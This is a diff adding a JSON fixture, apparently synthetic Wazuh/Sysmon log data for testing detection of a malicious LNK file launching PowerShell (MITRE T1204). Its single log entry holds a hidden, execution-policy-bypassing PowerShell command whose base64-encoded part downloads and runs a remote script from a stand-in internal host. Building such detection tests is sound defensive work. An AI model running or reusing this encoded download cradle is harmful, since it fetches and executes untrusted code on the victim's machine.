@@ -1,0 +1,88 @@
+{
+  "_metadata": {
+    "attack_id": "T1204",
+    "variation": "001",
+    "name": "User Execution - Malicious LNK File",
+    "description": "User double-clicks a malicious LNK shortcut file that spawns PowerShell with encoded downloader command via explorer.exe",
+    "expected_detection": "HIGH",
+    "kill_chain_phase": "execution",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Sysmon Event 1 - PowerShell spawned by explorer.exe via LNK double-click with encoded command",
+      "sequence": 1,
+      "timestamp": "2026-02-22T15:20:00.000Z",
+      "log": {
+        "timestamp": "2026-02-22T15:20:00.000+0000",
+        "rule": {
+          "level": 14,
+          "description": "Sysmon - Event 1: PowerShell Spawned by Explorer via LNK File",
+          "id": "100100",
+          "mitre": {
+            "id": [
+              "T1204"
+            ],
+            "tactic": [
+              "Execution"
+            ],
+            "technique": [
+              "User Execution"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000028.100005",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "opcode": "0",
+              "keywords": "0x8000000000000000",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-22 15:20:00.000",
+              "processGuid": "{C28A0F3E-0005-6E1A-2800-000000000100}",
+              "processId": "12756",
+              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "commandLine": "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgA1ADAAOgA4ADAAOAAwAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=",
+              "currentDirectory": "C:\\Users\\attacker\\Downloads\\",
+              "user": "CORP\\attacker",
+              "integrityLevel": "Medium",
+              "hashes": "SHA256=9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F",
+              "parentProcessGuid": "{C28A0F3E-0005-6E1A-2800-000000000099}",
+              "parentProcessId": "4328",
+              "parentImage": "C:\\Windows\\explorer.exe",
+              "parentCommandLine": "C:\\Windows\\explorer.exe"
+            }
+          }
+        }
+      }
+    }
+  ]
+}
